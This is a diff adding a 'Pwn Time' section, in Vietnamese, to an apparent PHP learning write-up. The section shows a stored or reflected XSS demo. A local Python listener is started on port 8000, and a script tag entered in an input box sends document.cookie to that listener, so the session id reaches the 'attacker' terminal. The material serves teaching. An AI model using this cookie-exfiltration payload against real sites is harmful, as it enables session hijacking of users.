@@ -66,4 +66,19 @@ echo "Age: " . $age;
 
 Kiểm tra có tồn tại khóa *key* ở trong dãy *var* không?
 
+## Pwn Time
+1. Tạo 1 local host port 8000 = python3
+
+![image](https://github.com/user-attachments/assets/340be4e7-2977-4853-b900-be0bea77fe46)
+
+2. 
+Mik sẽ chạy javascript trong input box, lúc đó biến 'name' = malicious code.
+```
+<script>window.location='http://127.0.0.1:8000/?cookie=' + document.cookie</script>
+```
+3. Kết quả
+![image](https://github.com/user-attachments/assets/206feb0f-cedc-40aa-9c1a-80c09e8c0baa)
+*Session id của user sẽ được gửi về terminal của attacker*
+
+
 
